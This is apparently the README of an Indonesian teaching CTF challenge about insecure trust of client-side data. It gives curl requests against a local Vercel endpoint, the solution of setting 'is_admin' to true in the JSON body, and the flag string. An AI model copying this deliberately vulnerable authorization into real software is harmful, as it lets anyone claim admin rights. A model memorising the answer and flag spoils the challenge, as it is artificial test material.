# CTF Web Exploitation — Manipulasi Request Body

Soal CTF sederhana yang dibuat di atas Vercel Serverless Function.
Tujuan: peserta belajar bahwa field yang dikirim dari sisi client (request body)
bisa dimanipulasi, dan server tidak boleh mempercayai field seperti `is_admin`
tanpa verifikasi yang benar.

## Endpoint

```
POST /api/login
Content-Type: application/json
```

## Cara Menjalankan

### 1. Jalankan secara lokal

Butuh Vercel CLI. Install dulu kalau belum:

```bash
npm install -g vercel
```

Lalu jalankan dev server:

```bash
vercel dev
```

Server akan jalan di `http://localhost:3000`.

### 2. Deploy ke Vercel

```bash
vercel --prod
```

## Cara Test dengan curl

### Request sebagai guest biasa (akan ditolak 403)

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "guest", "is_admin": false}'
```

Respon:

```json
{
  "success": false,
  "message": "Login sukses sebagai guest. Tapi kamu bukan admin! Akses flag ditolak. Coba manipulasi request body JSON Anda menjadi admin dengan is_admin true!",
  "hint": { "expected_username": "admin", "expected_is_admin": true }
}
```

### Request yang benar (solusi soal — mendapat flag)

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "is_admin": true}'
```

Respon (200 OK):

```json
{
  "success": true,
  "message": "Selamat! Kamu berhasil login sebagai admin dengan memanipulasi request body. Inilah flag-mu:",
  "flag": "FLAG{m4n1pul451_b0dy_v3rc3l_ok}"
}
```

## Solusi Soal

Soal ini mengajarkan konsep **Insecure Trust of Client-Side Data**.

- Aplikasi menerima field `is_admin` langsung dari request body JSON.
- Peserta cukup mengubah request body menjadi:

```json
{ "username": "admin", "is_admin": true }
```

- Server membaca field tersebut dan memberikan flag.

**Pelajaran keamanan:** di aplikasi nyata, status admin/otorisasi HARUS
diverifikasi di server (session, JWT yang ditandatangani, role dari database),
bukan dari field yang dikirim client. Field apapun di request body bisa
dipalsukan oleh penyerang.

## Struktur File

```
.
├── api/
│   └── login.js      # Handler Vercel API Route (endpoint POST /api/login)
├── package.json     # Konfigurasi project & script
├── vercel.json      # Konfigurasi Vercel
└── README.md        # Dokumentasi ini
```
